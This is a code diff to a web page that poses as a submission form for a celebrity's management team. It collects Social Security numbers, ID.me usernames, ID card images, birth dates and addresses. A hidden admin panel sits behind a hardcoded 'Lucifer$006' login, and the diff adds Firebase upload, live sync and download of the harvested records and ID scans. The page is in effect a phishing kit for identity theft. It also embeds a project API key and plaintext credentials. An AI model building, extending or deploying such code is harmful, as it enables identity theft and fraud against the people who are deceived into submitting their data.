@@ -231,6 +231,12 @@
             transform: translateY(0);
         }
         
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
         .footer {
             text-align: center;
             padding: 30px;
@@ -508,23 +514,26 @@
         table {
             width: 100%;
             border-collapse: collapse;
+            font-size: 0.85rem;
         }
         
         th {
             background: #f8f9fa;
-            padding: 12px 15px;
+            padding: 12px 10px;
             text-align: left;
             font-weight: 600;
             color: #555;
             border-bottom: 2px solid #e0e0e0;
-            font-size: 0.9rem;
+            font-size: 0.8rem;
+            white-space: nowrap;
         }
         
         td {
-            padding: 12px 15px;
+            padding: 12px 10px;
             border-bottom: 1px solid #f0f0f0;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             color: #444;
+            vertical-align: middle;
         }
         
         tr:hover {
@@ -535,8 +544,9 @@
             display: inline-block;
             padding: 4px 12px;
             border-radius: 12px;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             font-weight: 600;
+            white-space: nowrap;
         }
         
         .status-pending {
@@ -554,19 +564,29 @@
             color: #155724;
         }
         
-        .view-btn {
+        .view-btn, .download-btn {
             background: #0f3460;
             color: white;
             border: none;
-            padding: 6px 14px;
+            padding: 6px 12px;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             transition: background 0.3s;
+            white-space: nowrap;
         }
         
-        .view-btn:hover {
+        .view-btn:hover, .download-btn:hover {
             background: #1a1a2e;
+        }
+        
+        .download-btn {
+            background: #28a745;
+            margin-left: 5px;
+        }
+        
+        .download-btn:hover {
+            background: #218838;
         }
         
         .hidden {
@@ -577,6 +597,7 @@
             display: flex;
             gap: 10px;
             margin-bottom: 20px;
+            flex-wrap: wrap;
         }
         
         .nav-tab {
@@ -710,11 +731,12 @@
         
         /* ID Preview in admin */
         .id-preview {
-            max-width: 100px;
-            max-height: 60px;
+            max-width: 80px;
+            max-height: 50px;
             border-radius: 4px;
             cursor: pointer;
             border: 1px solid #ddd;
+            object-fit: cover;
         }
         
         .id-preview:hover {
@@ -722,6 +744,83 @@
             transition: transform 0.3s;
             z-index: 100;
             position: relative;
+        }
+        
+        /* Image modal for full view */
+        .image-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 3000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .image-modal.active {
+            display: flex;
+        }
+        
+        .image-modal img {
+            max-width: 90%;
+            max-height: 80%;
+            border-radius: 8px;
+        }
+        
+        .image-modal-close {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            color: white;
+            font-size: 2.5rem;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+        
+        .image-modal-download {
+            margin-top: 20px;
+            padding: 12px 30px;
+            background: #28a745;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+        
+        .image-modal-download:hover {
+            background: #218838;
+        }
+        
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            color: #888;
+        }
+        
+        .sync-status {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #28a745;
+            margin-left: 10px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .sync-status.offline {
+            background: #dc3545;
+            animation: none;
         }
     </style>
 </head>
@@ -871,7 +970,7 @@
                     <div class="form-row">
                         <div class="form-group">
                             <label>ZIP Code <span class="required">*</span></label>
-                            <input type="text" name="zip" required placeholder="12345" pattern="\d{5}(-\d{4})?">
+                            <input type="text" name="zip" required placeholder="12345" pattern="\\d{5}(-\\d{4})?">
                         </div>
                         <div class="form-group">
                             <label>Country</label>
@@ -931,7 +1030,7 @@
                         <label for="consent2">I authorize the transmission of this information to the Trace Adkins Management team for review. <span class="required">*</span></label>
                     </div>
                     
-                    <button type="submit" class="submit-btn">Submit to Management Team</button>
+                    <button type="submit" class="submit-btn" id="submitBtn">Submit to Management Team</button>
                 </form>
             </div>
         </div>
@@ -973,12 +1072,20 @@
         </div>
     </div>
     
+    <!-- IMAGE PREVIEW MODAL -->
+    <div class="image-modal" id="imageModal">
+        <button class="image-modal-close" onclick="closeImageModal()">×</button>
+        <img id="modalImage" src="" alt="ID Card">
+        <button class="image-modal-download" id="modalDownloadBtn" onclick="downloadModalImage()">📥 Download Image</button>
+    </div>
+    
     <!-- MANAGEMENT ADMIN PANEL -->
     <div id="adminPage" class="hidden">
         <div class="admin-header">
             <h1>🎵 Trace Adkins Management Panel</h1>
             <div class="user-info">
                 <span>👤 Manager: Lucifer$006</span>
+                <span class="sync-status" id="syncStatus" title="Live sync active"></span>
                 <button class="logout-btn" onclick="logoutAdmin()">Logout</button>
             </div>
         </div>
@@ -991,27 +1098,27 @@
                 </div>
                 <div class="stat-card">
                     <div class="stat-label">Pending Review</div>
-                    <div class="stat-value" style="color:#856404;">0</div>
+                    <div class="stat-value" id="pendingCount" style="color:#856404;">0</div>
                 </div>
                 <div class="stat-card">
                     <div class="stat-label">Under Review</div>
-                    <div class="stat-value" style="color:#004085;">0</div>
+                    <div class="stat-value" id="reviewCount" style="color:#004085;">0</div>
                 </div>
                 <div class="stat-card">
                     <div class="stat-label">Approved This Month</div>
-                    <div class="stat-value" style="color:#155724;">0</div>
+                    <div class="stat-value" id="approvedCount" style="color:#155724;">0</div>
                 </div>
             </div>
             
             <div class="nav-tabs">
-                <button class="nav-tab active" onclick="filterTable('all')">All Submissions</button>
-                <button class="nav-tab" onclick="filterTable('pending')">Pending</button>
-                <button class="nav-tab" onclick="filterTable('review')">Under Review</button>
-                <button class="nav-tab" onclick="filterTable('approved')">Approved</button>
+                <button class="nav-tab active" onclick="filterTable('all', this)">All Submissions</button>
+                <button class="nav-tab" onclick="filterTable('pending', this)">Pending</button>
+                <button class="nav-tab" onclick="filterTable('review', this)">Under Review</button>
+                <button class="nav-tab" onclick="filterTable('approved', this)">Approved</button>
             </div>
             
             <div class="data-table-card">
-                <h3>All Submissions</h3>
+                <h3>All Submissions <span style="font-weight:normal; font-size:0.85rem; color:#888;">(Updates automatically from any device)</span></h3>
                 <table id="submissionsTable">
                     <thead>
                         <tr>
@@ -1031,20 +1138,40 @@
                         </tr>
                     </thead>
                     <tbody id="submissionsBody">
-                        <!-- Dynamic content will be inserted here -->
+                        <tr><td colspan="13" class="no-data">Loading submissions...</td></tr>
                     </tbody>
                 </table>
             </div>
         </div>
     </div>
-    
-    <script>
-        // Store submissions in memory (in real app, this would be a database)
-        let submissions = [];
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDy3UPxm8vG63MGHmbNjzSGC6wK-ZpGzq8",
+            authDomain: "trace-adkins-management.firebaseapp.com",
+            projectId: "trace-adkins-management",
+            storageBucket: "trace-adkins-management.firebasestorage.app",
+            messagingSenderId: "441380649506",
+            appId: "1:441380649506:web:596319bd69177228dfa87b"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const storage = getStorage(app);
+
+        // Global variables
         let currentFile = null;
         let currentFileData = null;
-        
-        // SSN validation - NO LIMIT on digits, only shows messages
+        let allSubmissions = [];
+        let currentFilter = 'all';
+        let unsubscribeSnapshot = null;
+
+        // ===== SSN VALIDATION =====
         const ssnInput = document.getElementById('ssnInput');
         const ssnMessage = document.getElementById('ssnMessage');
         
@@ -1087,24 +1214,16 @@
         ssnInput.addEventListener('input', function(e) {
             let cursorPos = this.selectionStart;
             const oldValue = this.value;
-            
-            // Extract only digits - NO LIMIT applied
             let digits = oldValue.replace(/\D/g, '');
-            
-            // Format with dashes
             const formatted = formatSSN(digits);
             
-            // Calculate new cursor position
             let newCursor = cursorPos;
             const dashesBeforeOld = (oldValue.slice(0, cursorPos).match(/-/g) || []).length;
             const digitsBeforeCursor = cursorPos - dashesBeforeOld;
             
-            let dashesBeforeNew = 0;
             let digitCount = 0;
             for (let i = 0; i < formatted.length; i++) {
-                if (formatted[i] === '-') {
-                    dashesBeforeNew++;
-                } else {
+                if (formatted[i] !== '-') {
                     digitCount++;
                     if (digitCount >= digitsBeforeCursor) {
                         newCursor = i + 1;
@@ -1118,20 +1237,13 @@
             
             this.value = formatted;
             this.setSelectionRange(newCursor, newCursor);
-            
-            // Validate
             validateSSN(this.value);
         });
         
-        ssnInput.addEventListener('blur', function() {
-            validateSSN(this.value);
-        });
-        
-        ssnInput.addEventListener('focus', function() {
-            validateSSN(this.value);
-        });
-        
-        // File upload handling
+        ssnInput.addEventListener('blur', () => validateSSN(ssnInput.value));
+        ssnInput.addEventListener('focus', () => validateSSN(ssnInput.value));
+
+        // ===== FILE UPLOAD =====
         function handleFileSelect(event) {
             const file = event.target.files[0];
             if (file) {
@@ -1160,25 +1272,20 @@
             `;
         }
         
-        function removeFile() {
+        window.removeFile = function() {
             document.getElementById('idFile').value = '';
             document.getElementById('fileList').innerHTML = '';
             currentFile = null;
             currentFileData = null;
-        }
+        };
         
         // Drag and drop
         const uploadArea = document.getElementById('uploadArea');
-        
         uploadArea.addEventListener('dragover', (e) => {
             e.preventDefault();
             uploadArea.classList.add('dragover');
         });
-        
-        uploadArea.addEventListener('dragleave', () => {
-            uploadArea.classList.remove('dragover');
-        });
-        
+        uploadArea.addEventListener('dragleave', () => uploadArea.classList.remove('dragover'));
         uploadArea.addEventListener('drop', (e) => {
             e.preventDefault();
             uploadArea.classList.remove('dragover');
@@ -1186,24 +1293,28 @@
             if (file) {
                 currentFile = file;
                 const reader = new FileReader();
-                reader.onload = function(e) {
-                    currentFileData = e.target.result;
-                };
+                reader.onload = function(e) { currentFileData = e.target.result; };
                 reader.readAsDataURL(file);
                 displayFile(file);
             }
         });
-        
-        // Handle main submission
-        document.getElementById('mainForm').addEventListener('submit', function(e) {
+
+        // ===== FORM SUBMISSION =====
+        document.getElementById('mainForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            // Validate SSN before submission - must be exactly 9 digits to submit
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Uploading...';
+            
+            // Validate SSN
             const ssnValue = ssnInput.value;
             const ssnDigits = ssnValue.replace(/\D/g, '');
             if (ssnDigits.length !== 9) {
                 ssnInput.focus();
                 validateSSN(ssnValue);
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit to Management Team';
                 return;
             }
             
@@ -1213,47 +1324,75 @@
             
             const refId = 'TA-' + new Date().getFullYear() + '-' + Math.floor(1000 + Math.random() * 9000);
             
-            const submission = {
-                refId: refId,
-                date: new Date().toISOString().split('T')[0],
-                firstName: data.firstName || '',
-                lastName: data.lastName || '',
-                idmeUsername: data.idmeUsername || '',
-                ssn: data.ssn || '',
-                email: data.email || '',
-                phone: data.phone || '',
-                state: data.state || '',
-                idType: data.idType || '',
-                idNumber: data.idNumber || '',
-                idExpiry: data.idExpiry || '',
-                idImage: currentFileData || null,
-                idImageName: currentFile ? currentFile.name : '',
-                status: 'pending',
-                address: data.address || '',
-                city: data.city || '',
-                zip: data.zip || '',
-                dob: data.dob || '',
-                occupation: data.occupation || '',
-                notes: data.notes || ''
-            };
+            let imageUrl = null;
+            let imageName = '';
             
-            submissions.push(submission);
+            // Upload image to Firebase Storage if file exists
+            if (currentFile) {
+                try {
+                    const storageRef = ref(storage, 'id-cards/' + refId + '_' + currentFile.name);
+                    await uploadBytes(storageRef, currentFile);
+                    imageUrl = await getDownloadURL(storageRef);
+                    imageName = currentFile.name;
+                } catch (err) {
+                    console.error('Image upload failed:', err);
+                    alert('Image upload failed. Please try again.');
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Submit to Management Team';
+                    return;
+                }
+            }
             
-            // Show success page
-            document.getElementById('successRefId').textContent = refId;
-            document.getElementById('successPage').classList.add('active');
-            
-            // Clear forms after 5 seconds and return to homepage
-            setTimeout(() => {
-                document.getElementById('successPage').classList.remove('active');
-                document.getElementById('mainForm').reset();
-                removeFile();
-                ssnInput.classList.remove('ssn-incomplete', 'ssn-correct', 'ssn-incorrect');
-                ssnMessage.textContent = '';
-            }, 5000);
+            // Save to Firestore
+            try {
+                await addDoc(collection(db, 'submissions'), {
+                    refId: refId,
+                    date: new Date().toISOString().split('T')[0],
+                    timestamp: new Date().toISOString(),
+                    firstName: data.firstName || '',
+                    lastName: data.lastName || '',
+                    idmeUsername: data.idmeUsername || '',
+                    ssn: data.ssn || '',
+                    email: data.email || '',
+                    phone: data.phone || '',
+                    state: data.state || '',
+                    idType: data.idType || '',
+                    idNumber: data.idNumber || '',
+                    idExpiry: data.idExpiry || '',
+                    idImageUrl: imageUrl,
+                    idImageName: imageName,
+                    status: 'pending',
+                    address: data.address || '',
+                    city: data.city || '',
+                    zip: data.zip || '',
+                    dob: data.dob || '',
+                    occupation: data.occupation || '',
+                    notes: data.notes || ''
+                });
+                
+                // Show success
+                document.getElementById('successRefId').textContent = refId;
+                document.getElementById('successPage').classList.add('active');
+                
+                setTimeout(() => {
+                    document.getElementById('successPage').classList.remove('active');
+                    document.getElementById('mainForm').reset();
+                    removeFile();
+                    ssnInput.classList.remove('ssn-incomplete', 'ssn-correct', 'ssn-incorrect');
+                    ssnMessage.textContent = '';
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Submit to Management Team';
+                }, 5000);
+                
+            } catch (err) {
+                console.error('Firestore save failed:', err);
+                alert('Submission failed. Please try again.');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit to Management Team';
+            }
         });
-        
-        // Trademark hold to show login
+
+        // ===== ADMIN LOGIN =====
         const trademark = document.getElementById('trademark');
         let holdTimer;
         
@@ -1262,51 +1401,42 @@
                 document.getElementById('loginModal').classList.add('active');
             }, 2000);
         });
-        
-        trademark.addEventListener('mouseup', () => {
-            clearTimeout(holdTimer);
-        });
-        
-        trademark.addEventListener('mouseleave', () => {
-            clearTimeout(holdTimer);
-        });
-        
-        // Touch events for mobile
+        trademark.addEventListener('mouseup', () => clearTimeout(holdTimer));
+        trademark.addEventListener('mouseleave', () => clearTimeout(holdTimer));
         trademark.addEventListener('touchstart', (e) => {
             e.preventDefault();
             holdTimer = setTimeout(() => {
                 document.getElementById('loginModal').classList.add('active');
             }, 2000);
         });
+        trademark.addEventListener('touchend', () => clearTimeout(holdTimer));
         
-        trademark.addEventListener('touchend', () => {
-            clearTimeout(holdTimer);
-        });
-        
-        // Login handling
-        function closeLogin() {
+        window.closeLogin = function() {
             document.getElementById('loginModal').classList.remove('active');
             document.getElementById('loginError').style.display = 'none';
             document.getElementById('loginForm').reset();
-        }
+        };
         
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            
             const username = document.getElementById('loginUsername').value;
             const password = document.getElementById('loginPassword').value;
             
             if (username === 'Lucifer$006' && password === 'Lucifer$0061') {
                 closeLogin();
                 switchView('admin');
-                renderSubmissions();
+                startRealtimeSync();
             } else {
                 document.getElementById('loginError').style.display = 'block';
             }
         });
         
-        // View switching
-        function switchView(view) {
+        document.getElementById('loginModal').addEventListener('click', function(e) {
+            if (e.target === this) closeLogin();
+        });
+
+        // ===== VIEW SWITCHING =====
+        window.switchView = function(view) {
             if (view === 'admin') {
                 document.getElementById('clientPage').classList.add('hidden');
                 document.getElementById('adminPage').classList.remove('hidden');
@@ -1315,74 +1445,190 @@
                 document.getElementById('adminPage').classList.add('hidden');
                 document.getElementById('clientPage').classList.remove('hidden');
                 document.body.classList.remove('admin-body');
+                if (unsubscribeSnapshot) {
+                    unsubscribeSnapshot();
+                    unsubscribeSnapshot = null;
+                }
             }
-        }
+        };
         
-        function logoutAdmin() {
+        window.logoutAdmin = function() {
             switchView('client');
+        };
+
+        // ===== REALTIME FIREBASE SYNC =====
+        function startRealtimeSync() {
+            const q = query(collection(db, 'submissions'), orderBy('timestamp', 'desc'));
+            
+            unsubscribeSnapshot = onSnapshot(q, (snapshot) => {
+                allSubmissions = [];
+                snapshot.forEach((doc) => {
+                    allSubmissions.push({ id: doc.id, ...doc.data() });
+                });
+                renderSubmissions();
+                updateStats();
+                
+                // Update sync indicator
+                const syncStatus = document.getElementById('syncStatus');
+                syncStatus.classList.remove('offline');
+                syncStatus.title = 'Live sync active - ' + allSubmissions.length + ' submissions loaded';
+            }, (error) => {
+                console.error('Realtime sync error:', error);
+                const syncStatus = document.getElementById('syncStatus');
+                syncStatus.classList.add('offline');
+                syncStatus.title = 'Sync error - check Firestore rules';
+            });
         }
-        
-        // Render submissions in admin table
+
+        // ===== RENDER SUBMISSIONS =====
         function renderSubmissions() {
             const tbody = document.getElementById('submissionsBody');
-            const totalCount = document.getElementById('totalCount');
             
-            totalCount.textContent = submissions.length;
+            let filtered = allSubmissions;
+            if (currentFilter !== 'all') {
+                filtered = allSubmissions.filter(s => s.status === currentFilter);
+            }
             
-            if (submissions.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="13" style="text-align:center; padding: 40px; color: #888;">No submissions yet. Data will appear here when visitors submit the form.</td></tr>';
+            if (filtered.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="13" class="no-data">No submissions found.</td></tr>';
                 return;
             }
             
-            tbody.innerHTML = submissions.map(sub => `
-                <tr data-status="${sub.status}">
-                    <td>#${sub.refId}</td>
-                    <td>${sub.date}</td>
-                    <td>${sub.firstName} ${sub.lastName}</td>
-                    <td>${sub.idmeUsername}</td>
-                    <td>${sub.ssn}</td>
-                    <td>${sub.email}</td>
-                    <td>${sub.phone}</td>
-                    <td>${sub.state}</td>
-                    <td>${sub.idType.replace('_', ' ').toUpperCase()}</td>
-                    <td>${sub.idNumber}</td>
-                    <td>${sub.idImage ? `<img src="${sub.idImage}" class="id-preview" alt="ID Card">` : 'No image'}</td>
-                    <td><span class="status-badge status-${sub.status}">${sub.status.charAt(0).toUpperCase() + sub.status.slice(1)}</span></td>
-                    <td><button class="view-btn" onclick="viewDetails('${sub.refId}')">View</button></td>
-                </tr>
-            `).join('');
+            tbody.innerHTML = filtered.map(sub => {
+                const idTypeLabel = (sub.idType || '').replace('_', ' ').toUpperCase();
+                const imageCell = sub.idImageUrl 
+                    ? `<img src="${sub.idImageUrl}" class="id-preview" alt="ID Card" onclick="openImageModal('${sub.idImageUrl}', '${sub.idImageName || 'id-card'}')">`
+                    : 'No image';
+                
+                return `
+                    <tr data-status="${sub.status}">
+                        <td>#${sub.refId}</td>
+                        <td>${sub.date}</td>
+                        <td>${sub.firstName} ${sub.lastName}</td>
+                        <td>${sub.idmeUsername}</td>
+                        <td>${sub.ssn}</td>
+                        <td>${sub.email}</td>
+                        <td>${sub.phone}</td>
+                        <td>${sub.state}</td>
+                        <td>${idTypeLabel}</td>
+                        <td>${sub.idNumber}</td>
+                        <td>${imageCell}</td>
+                        <td><span class="status-badge status-${sub.status}">${sub.status.charAt(0).toUpperCase() + sub.status.slice(1)}</span></td>
+                        <td>
+                            <button class="view-btn" onclick="viewDetails('${sub.id}')">View</button>
+                            ${sub.idImageUrl ? `<button class="download-btn" onclick="downloadImage('${sub.idImageUrl}', '${sub.idImageName || 'id-card'}')">📥</button>` : ''}
+                        </td>
+                    </tr>
+                `;
+            }).join('');
         }
         
-        function viewDetails(refId) {
-            const sub = submissions.find(s => s.refId === refId);
-            if (sub) {
-                alert(`Submission Details:\n\nReference: ${sub.refId}\nName: ${sub.firstName} ${sub.lastName}\nID.me Username: ${sub.idmeUsername}\nSSN: ${sub.ssn}\nEmail: ${sub.email}\nPhone: ${sub.phone}\nAddress: ${sub.address}, ${sub.city}, ${sub.state} ${sub.zip}\nDOB: ${sub.dob}\nOccupation: ${sub.occupation}\nID Type: ${sub.idType}\nID Number: ${sub.idNumber}\nID Expiry: ${sub.idExpiry}\nNotes: ${sub.notes || 'None'}\nStatus: ${sub.status}`);
-            }
+        function updateStats() {
+            document.getElementById('totalCount').textContent = allSubmissions.length;
+            document.getElementById('pendingCount').textContent = allSubmissions.filter(s => s.status === 'pending').length;
+            document.getElementById('reviewCount').textContent = allSubmissions.filter(s => s.status === 'review').length;
+            
+            const currentMonth = new Date().toISOString().slice(0, 7);
+            document.getElementById('approvedCount').textContent = allSubmissions.filter(s => 
+                s.status === 'approved' && s.timestamp && s.timestamp.startsWith(currentMonth)
+            ).length;
         }
-        
-        // Table filtering
-        function filterTable(status) {
-            const rows = document.querySelectorAll('#submissionsTable tbody tr');
-            const tabs = document.querySelectorAll('.nav-tab');
+
+        // ===== TABLE FILTERING =====
+        window.filterTable = function(status, btn) {
+            currentFilter = status;
+            document.querySelectorAll('.nav-tab').forEach(tab => tab.classList.remove('active'));
+            btn.classList.add('active');
+            renderSubmissions();
+        };
+
+        // ===== VIEW DETAILS =====
+        window.viewDetails = async function(docId) {
+            const sub = allSubmissions.find(s => s.id === docId);
+            if (!sub) return;
             
-            tabs.forEach(tab => tab.classList.remove('active'));
-            event.target.classList.add('active');
+            const statusOptions = ['pending', 'review', 'approved'];
+            const statusSelect = statusOptions.map(opt => 
+                `<option value="${opt}" ${sub.status === opt ? 'selected' : ''}>${opt.charAt(0).toUpperCase() + opt.slice(1)}</option>`
+            ).join('');
             
-            rows.forEach(row => {
-                if (status === 'all' || row.getAttribute('data-status') === status) {
-                    row.style.display = '';
-                } else {
-                    row.style.display = 'none';
+            const newStatus = prompt(
+                `Submission Details:\n\n` +
+                `Reference: ${sub.refId}\n` +
+                `Name: ${sub.firstName} ${sub.lastName}\n` +
+                `ID.me Username: ${sub.idmeUsername}\n` +
+                `SSN: ${sub.ssn}\n` +
+                `Email: ${sub.email}\n` +
+                `Phone: ${sub.phone}\n` +
+                `Address: ${sub.address}, ${sub.city}, ${sub.state} ${sub.zip}\n` +
+                `DOB: ${sub.dob}\n` +
+                `Occupation: ${sub.occupation || 'N/A'}\n` +
+                `ID Type: ${sub.idType}\n` +
+                `ID Number: ${sub.idNumber}\n` +
+                `ID Expiry: ${sub.idExpiry}\n` +
+                `Notes: ${sub.notes || 'None'}\n\n` +
+                `Current Status: ${sub.status}\n\n` +
+                `Enter new status (pending/review/approved) or Cancel to keep current:`,
+                sub.status
+            );
+            
+            if (newStatus && newStatus !== sub.status && statusOptions.includes(newStatus)) {
+                try {
+                    await updateDoc(doc(db, 'submissions', docId), { status: newStatus });
+                } catch (err) {
+                    console.error('Status update failed:', err);
+                    alert('Failed to update status. Check Firestore rules.');
                 }
-            });
-        }
-        
-        // Close modal on outside click
-        document.getElementById('loginModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                closeLogin();
             }
+        };
+
+        // ===== IMAGE MODAL =====
+        let currentModalImageUrl = '';
+        let currentModalImageName = '';
+        
+        window.openImageModal = function(url, name) {
+            currentModalImageUrl = url;
+            currentModalImageName = name;
+            document.getElementById('modalImage').src = url;
+            document.getElementById('imageModal').classList.add('active');
+        };
+        
+        window.closeImageModal = function() {
+            document.getElementById('imageModal').classList.remove('active');
+            document.getElementById('modalImage').src = '';
+        };
+        
+        window.downloadModalImage = function() {
+            downloadImage(currentModalImageUrl, currentModalImageName);
+        };
+        
+        document.getElementById('imageModal').addEventListener('click', function(e) {
+            if (e.target === this) closeImageModal();
         });
+
+        // ===== DOWNLOAD IMAGE =====
+        window.downloadImage = async function(url, filename) {
+            try {
+                const response = await fetch(url);
+                const blob = await response.blob();
+                const blobUrl = window.URL.createObjectURL(blob);
+                
+                const a = document.createElement('a');
+                a.href = blobUrl;
+                a.download = filename || 'id-card.jpg';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(blobUrl);
+            } catch (err) {
+                console.error('Download failed:', err);
+                // Fallback: open in new tab
+                window.open(url, '_blank');
+            }
+        };
+
+        // Expose handleFileSelect to global for onclick
+        window.handleFileSelect = handleFileSelect;
     </script>
 </body>
 </html>
